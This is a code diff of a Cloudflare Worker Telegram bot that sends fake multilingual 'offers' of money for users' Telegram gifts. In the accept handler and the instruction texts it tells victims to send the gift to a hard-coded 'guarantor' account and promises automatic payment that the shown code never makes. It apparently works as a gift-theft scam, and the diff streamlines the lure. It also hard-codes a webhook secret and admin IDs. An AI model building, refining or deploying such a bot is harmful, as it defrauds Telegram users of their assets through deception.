@@ -1,11 +1,10 @@
 const ADMIN_ID_1 = 5151757168; 
-const ADMIN_ID_2 = 7423713851; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
-const RELAYER_USERNAME = "GarisOffer_Relayer"; 
+const RELAYER_USERNAME = "GarisOfferRelayer"; 
 
 export default {
   async fetch(request, env, ctx) {
-    const BOT_TOKEN = env.BOT_TOKEN; // Сюда в Cloudflare нужно вставить токен НОВОГО бота
+    const BOT_TOKEN = env.BOT_TOKEN; 
     const kv = env.USERS_KV; 
 
     if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });
@@ -26,8 +25,7 @@ export default {
 
         if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        // ИНСТРУКЦИЯ КАК ПРИНЯТЬ ОФФЕР (как в закрытом боте)
-        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту.\n4. Оплата приходит автоматически.`;
         
         const startMarkup = {
           inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -36,7 +34,7 @@ export default {
         await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
       }
 
-      // --- INLINE-ЗАПРОСЫ (ДОСТУП ДЛЯ ВСЕХ) ---
+      // --- INLINE-ЗАПРОСЫ ---
       if (update.inline_query) {
         const iq = update.inline_query;
         const userId = iq.from.id;
@@ -69,7 +67,6 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         
-        // ВСЕГДА ГАРАНТ
         const targetReceiver = RELAYER_USERNAME;
 
         let text = "";
@@ -77,18 +74,19 @@ export default {
         let btnDecline = "Отклонить";
         let titleText = "";
 
+        // Минималистичный текст
         if (lang === "en") {
-            text = `<b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
+            text = `<b>Gift Offer</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
             btnAccept = "Accept";
             btnDecline = "Decline";
             titleText = `Offer: ${amount} ${currencyDisplay}`;
         } else if (lang === "cn") {
-            text = `<b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
+            text = `<b>礼物报价</b>\n\n有人为您提供 <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
             btnAccept = "接受";
             btnDecline = "拒绝";
             titleText = `报价: ${amount} ${currencyDisplay}`;
         } else {
-            text = `<b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
+            text = `<b>Оффер на подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
             btnAccept = "Принять";
             btnDecline = "Отклонить";
             titleText = `Оффер: ${amount} ${currencyDisplay}`;
@@ -119,7 +117,7 @@ export default {
         
         if (cq.data === "how_to_accept") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Нажмите кнопку «🎁 Передать подарок» в сообщении от бота\n\n<b>Шаг 4.</b> Откроется страница подарка — нажмите там кнопку «Передать»\n\n<b>Шаг 5.</b> Выберите продавца из списка и подтвердите передачу\n\n<b>Шаг 6.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
+          const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок гаранту.\n4. Оплата придет автоматически.`;
           const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
           try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
         }
@@ -127,7 +125,7 @@ export default {
         if (cq.data === "back_to_start") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
+          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту.\n4. Оплата приходит автоматически.`;
           const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
           try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
         }
@@ -162,23 +160,25 @@ export default {
           let newMarkup = { inline_keyboard: [] };
 
           if (action === "acc") {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: lang === "en" ? `Offer accepted ✅\n\nClick "Gift" to open it` : `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, show_alert: true }, BOT_TOKEN);
+            // ПРОСТОЕ ОКНО
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
             
             const finalUrl = "https://t.me/" + targetReceiver;
 
+            // МИНИМАЛИСТИЧНЫЙ ТЕКСТ ПОСЛЕ ПРИНЯТИЯ
             if (lang === "en") {
-                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${targetReceiver}).`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] };
+                newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to:\n\n‼️ <b>Important:</b> send the gift exactly to the guarantor <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
             } else if (lang === "cn") {
-                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n要获得 ${amount} ${displayCurrency}，请将礼物发送给卖家 (@${targetReceiver})。`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 发送礼物", url: finalUrl }]] };
+                newText = `✅ <b>已接受</b>\n\n要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送至：\n\n‼️ <b>重要：</b>请将礼物发送给担保人 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
             } else {
-                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${targetReceiver}).`;
-                newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] };
+                newText = `✅ <b>Принято</b>\n\nЧтобы получить <b>${amount} ${displayCurrency}</b>, отправьте подарок:\n\n‼️ <b>Важно:</b> отправьте подарок именно гаранту <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
             }
           } else {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
+            newText = lang === "en" ? `❌ <b>Declined</b>` : `❌ <b>Отклонено</b>`;
           }
 
           if (cq.inline_message_id) {
